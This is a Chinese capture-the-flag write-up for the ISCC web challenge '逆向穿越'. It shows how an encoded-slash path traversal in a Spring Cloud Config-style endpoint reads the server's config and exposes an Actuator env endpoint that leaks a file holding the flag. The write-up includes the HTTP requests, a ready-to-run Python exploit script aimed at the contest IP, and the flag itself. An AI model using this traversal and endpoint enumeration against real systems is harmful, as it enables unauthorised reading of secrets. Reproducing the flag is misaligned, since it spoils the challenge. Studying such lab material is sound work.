---
title: "逆向穿越"
ctf: "ISCC"
date: 2026-05-15
category: web
difficulty: medium
points: 0
flag_format: "ISCC{...}"
author: "Codex"
---

# 逆向穿越

## Summary

这题的核心是 Spring Cloud Config 风格的配置拉取接口存在路径穿越，而且对 URL 编码后的绝对路径没有做有效拦截。通过读取 `/app/application.yml` 可以拿到 Actuator 的隐藏入口，再从 `/internal-monitor-xyz123/env` 泄露出的环境变量里拿到诊断备份下载地址，最终在 `.dat` 文件中直接提取出 flag。

## Solution

### Step 1: 发现配置接口并利用编码绝对路径穿越

首页直接暴露了接口格式：

```text
GET /config/{app}/{profile}/{filename}
```

正常访问：

```http
GET /config/app/dev/application.yml
```

返回的是仓库里的模拟配置，其中给了明显提示：

```yaml
hint: 'This is just a mock repository config. The real secrets are in the main application.yml at the system root (/app/application.yml).'
```

说明真正有价值的是服务器根目录下的 `/app/application.yml`。题目对直接绝对路径有防护，但没有拦截 URL 编码后的 `/`，因此可以把文件名替换为：

```text
%2fapp%2fapplication.yml
```

构造请求：

```http
GET /config/app/dev/%2fapp%2fapplication.yml
```

成功读取到真实配置，关键内容如下：

```yaml
management:
  endpoints:
    web:
      base-path: "/internal-monitor-xyz123"
      exposure:
        include: "env"

system:
  diagnostic:
    backup-download-path: ${SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH}
```

这里给出了两个关键情报：

1. Actuator 的基础路径是 `/internal-monitor-xyz123`
2. 可访问 `env` 端点
3. 诊断备份路径来自环境变量 `SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH`

### Step 2: 访问 Actuator env 泄露内部下载路径

请求：

```http
GET /internal-monitor-xyz123/env
```

在返回 JSON 中搜索 `SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH`，得到：

```text
/api/v3/internal/dev/diagnostics/snapshot/8e2f1a4b.dat
```

虽然 `FLAG` 环境变量被 `keys-to-sanitize` 规则打码成 `******`，但题目把真正的 flag 留在了诊断备份文件里，因此继续访问这个内部下载地址即可。

### Step 3: 下载诊断文件并提取 flag

请求：

```http
GET /api/v3/internal/dev/diagnostics/snapshot/8e2f1a4b.dat
```

下载后文件看起来像乱码，但直接搜索 `ISCC{` 即可命中 flag。

下面是一份可直接复现的 Python 脚本：

```python
import re
import requests

BASE = "http://39.105.213.28:12602"

session = requests.Session()

# 1. 通过编码后的绝对路径读取 /app/application.yml
resp = session.get(f"{BASE}/config/app/dev/%2fapp%2fapplication.yml", timeout=10)
resp.raise_for_status()
config_text = resp.text
print("[+] /app/application.yml loaded")

# 2. 提取 Actuator base-path
base_path_match = re.search(r'base-path:\s*"([^"]+)"', config_text)
if not base_path_match:
    raise RuntimeError("base-path not found")
base_path = base_path_match.group(1)
print(f"[+] actuator path: {base_path}")

# 3. 访问 env，拿到备份下载地址
env_resp = session.get(f"{BASE}{base_path}/env", timeout=10)
env_resp.raise_for_status()
env_text = env_resp.text

backup_path_match = re.search(
    r'"SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH":\{"value":"([^"]+)"',
    env_text,
)
if not backup_path_match:
    raise RuntimeError("backup path not found")
backup_path = backup_path_match.group(1)
print(f"[+] backup path: {backup_path}")

# 4. 下载 .dat 并提取 flag
dat_resp = session.get(f"{BASE}{backup_path}", timeout=10)
dat_resp.raise_for_status()

flag_match = re.search(r'ISCC\{[^}]+\}', dat_resp.text)
if not flag_match:
    raise RuntimeError("flag not found")

print(flag_match.group(0))
```

运行结果：

```text
[+] /app/application.yml loaded
[+] actuator path: /internal-monitor-xyz123
[+] backup path: /api/v3/internal/dev/diagnostics/snapshot/8e2f1a4b.dat
ISCC{Double_Decode_Spring_Bingo_2026}
```

## Flag

```text
ISCC{Double_Decode_Spring_Bingo_2026}
```
